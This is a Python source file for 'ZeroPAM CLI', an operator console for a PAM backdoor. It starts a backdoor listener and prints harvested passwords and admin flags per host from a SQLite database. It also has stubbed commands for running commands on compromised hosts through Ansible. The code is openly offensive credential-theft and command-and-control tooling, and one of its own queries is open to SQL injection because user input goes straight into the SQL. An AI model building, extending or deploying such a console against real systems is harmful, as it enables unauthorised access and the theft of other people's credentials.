#!/usr/bin/python3
import os
import time
import socket
import sqlite3
import argparse
import threading
import subprocess
import pandas as pd
import ansible_runner
from utils.ping import ping_cmd
from utils.server import setup, server_args
from dotenv import load_dotenv

server_status = False
server_thread = None
stop_event = threading.Event()

def status():
    global server_status

    print(f"Server Status: {'🟢' if server_status else '🔴'}")
    print()
    print("Connected IPs:")

def help_cmd(cmd=None):
    help_help = """ 
help [command] - Show help for CLI commands (this menu right here!)
    """
    set_help = """ 
set group <ip addresses> - Create a group of IP addresses (Not implemented)
set target <ip address/group> - Set target host or group for exec command (Not implemented)
    """
    exec_help = """ 
exec <ip address/group> <command> - Executes a command on a host or group of hosts (Not implemented)
    """ 
    ping_help = """ 
ping <ip address> - Ansible pings an IP address (WIP)
    """ 
    show_help = """ 
show status - Show server status and connected IP addresses
show args - Show backdoor server arguments
show db [host] - Show collected passwords and admin information from backdoor, can specify specific host
show passwords [host] - Alias for show db (same functionality)
    """
    server_help = """
server up - Start backdoor server
server down - Stop backdoor server (WIP)
server args <argument string> - Set server arguments (in command line argument style)
    """ 

    if(cmd):
        print(f"{cmd} help:")
        if (cmd == "help"):
            print(help_help)
        elif (cmd == "set"):
            print(set_help)
        elif (cmd == "exec"):
            print(exec_help)
        elif (cmd == "ping"):
            print(ping_help)
        elif (cmd == "show"):
            print(show_help)
        elif (cmd == "server"):
            print(server_help)
        else:
            print("Not a command! Type help for commands")
    else:
        print("ZeroPAM CLI Help")
        print("Commands:")
        print("help [command] - Get command help information")
        print("set <arguments> - Set CLI configuration settings")
        print("exec <arguments> - Execute commands on connected machines")
        print("ping <arguments> - Ping an IP or group of IP addresses")
        print("show <arguments> - Show information")
        print("server <arguments> - Backdoor server options")
        print()
        print("Use help <command> for more information about commands!")

def start_listener(cmd_args):
    global server_status
    global server_thread

    print("Starting Server...")
    server_status = True

    server_thread = threading.Thread(target=setup, args=(cmd_args,stop_event))
    server_thread.daemon = True
    server_thread.start()

def stop_listener():
    global server_status
    global server_thread

    if (not server_thread):
        print("Server not running!")
        return False
    
    print("Stopping Server...")
    stop_event.set()
    server_status = False

def main():
    global server_status
    global server_thread
    prefix = ""
    cmd_args = ""

    if(os.stat(f"./utils/ansible/server_inventory.ini").st_size == 0):
        print("First time use detected! Setting up...")
        subprocess.run(f'echo "[all]" > ./utils/ansible/server_inventory.ini', shell=True, text=True)
        # subprocess.run(f"sed -i '/^[all]/a{ip}' utils/ansible/server_inventory.ini", shell=True, text=True)

    print(r"""

░▒▓████████▓▒░▒▓████████▓▒░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓██████████████▓▒░  
       ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ 
     ░▒▓██▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ 
   ░▒▓██▓▒░  ░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓██▓▒░    ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓████████▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ 
                                                                                                    
    """)
    print("Type help for help!")
    status()

    while True:

        if (server_thread):
            if (not server_thread.is_alive()):
                print("Server down!")
                server_status = False

        action = input(f"{prefix}\033[0;49;31m> \033[0m")
        if (action.strip() == ""):
            continue

        command = action.split()[0]

        if (command in ("exit", "quit", "q")):
            print("Bye!")
            break

        elif (command == "help"):
            # help
            # help <command>
            if (len(action.split()) == 1):
                help_cmd()
            else:
                help_cmd(action.split()[1])

        elif (command == "set"):
            # set group <group name> <ip addresses>
            # set target <group/ip(s)>
            # set default <username/password> [username/password]
            if (len(action.split()) == 1):
                help_cmd(command)
            else:
                print("set action completed")

        elif (command == "exec"):
            # REQ: group or ip(s) enabled
            # exec <command>
            if (len(action.split()) == 1):
                help_cmd(command)
            else:
                print("exec action completed")

        elif (command == "ping"):
            # ping <group>
            # ping <ip addresses>
            if (len(action.split()) == 1):
                help_cmd(command)
            else:
                ping_cmd(action.split()[1])

        elif (command == "show"):
            # show status
            # show groups
            # show db [host]
            # show passwords [host]
            # show ips
            # show args
            if (len(action.split()) == 1):
                help_cmd(command)
            else:
                split_action = action.split()
                if (split_action[1].strip() == "status"):
                    status()
                elif (split_action[1].strip() == "args"):
                    print(cmd_args)
                elif (split_action[1].strip() == "db" or split_action[1].strip() == "passwords"):
                    conn = sqlite3.connect('logins.db')
                    cursor = conn.cursor()
                    if (len(split_action) == 2):
                        print(pd.read_sql_query(f'''
                            SELECT * FROM passwords
                            ORDER BY ip, known_admin
                        ''', conn))
                    else:
                        print(pd.read_sql_query(f'''
                            SELECT * FROM passwords
                            WHERE ip = "{split_action[2]}"
                            ORDER BY known_admin
                        ''', conn))
                    pass
                else:
                    print(f"Unknown argument for server: {split_action[1].strip()}")

        elif (command == "server"):
            # server up
            # server down
            # server args <arg string>
            if (len(action.split()) == 1):
                help_cmd(command)
            else:
                split_action = action.split()
                if (split_action[1].strip() == "up"):
                    if (not cmd_args or cmd_args == ""):
                        cmd_args = server_args("")
                        print("Running Server with default arguments")
                        print(cmd_args)
                    start_listener(cmd_args)

                elif (split_action[1].strip() == "down"):
                    stop_listener()

                elif (split_action[1].strip() == "args"):
                    if (len(split_action) == 2):
                        print("Must provide argument when using server args!")
                    elif (split_action[2] == "reset"):
                        print("Server arguments reset!")
                        cmd_args = server_args("")
                    else:
                        try:
                            cmd_args = server_args(" ".join(split_action[2:]))
                            print("Success! New Server Arguments:")
                            print(cmd_args)
                        except (argparse.ArgumentError, SystemExit) as E:
                            print(f"ERROR PARSING ARGUMENTS: {E}")

                else:
                    print(f"Unknown argument for server: {action.split()[1].strip()}")

        else:
            print("Unrecognized command! Type help for help!")
        

if (__name__ == '__main__'):
    main()
        